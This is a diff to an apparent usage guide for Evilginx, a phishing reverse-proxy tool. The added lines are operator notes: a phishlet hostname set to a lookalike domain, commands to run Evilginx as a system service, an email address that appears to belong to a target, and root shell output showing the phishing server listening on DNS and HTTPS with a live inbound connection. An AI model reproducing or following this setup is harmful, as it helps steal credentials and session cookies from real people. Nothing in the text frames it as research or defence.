@@ -6,6 +6,32 @@ Welcome to Evilginx! This guide will help you understand the basic commands and 
 1. **sudo ~/evilginx2/bin/evilginx -p ~/evilginx2/phishlets**
    - Opens the phishlets directory in command line.
 
+: phishlets hostname gpt4 misorf-tg.top
+
+sudo systemctl daemon-reload
+sudo systemctl enable evilginx
+sudo systemctl start evilginx
+sudo systemctl status evilginx
+
+cd ~/evilginx2
+sudo ./bin/evilginx -p ./phishlets
+
+membership@oca-sf.org
+
+root@306517:~/evilginx2# sudo lsof -i :53
+sudo lsof -i :443
+COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+evilginx 93672 root    7u  IPv6 422284      0t0  UDP *:domain 
+COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+evilginx 93672 root    8u  IPv6 422285      0t0  TCP *:https (LISTEN)
+evilginx 93672 root   11u  IPv6 425769      0t0  TCP 23-227-196-78.static.hvvc.us:https->ec2-54-147-226-163.compute-1.amazonaws.com:44852 (ESTABLISHED)
+root@306517:~/evilginx2# sudo kill -9 93672
+root@306517:~/evilginx2# sudo lsof -i :443
+root@306517:~/evilginx2# sudo lsof -i :53
+root@306517:~/evilginx2# 
+
+
+
 2. **nano ~/evilginx2/bin/evilginx -p ~/blacklists.txt**
    - Opens the blacklist file in a text editor to check blacklisted IPs.
 
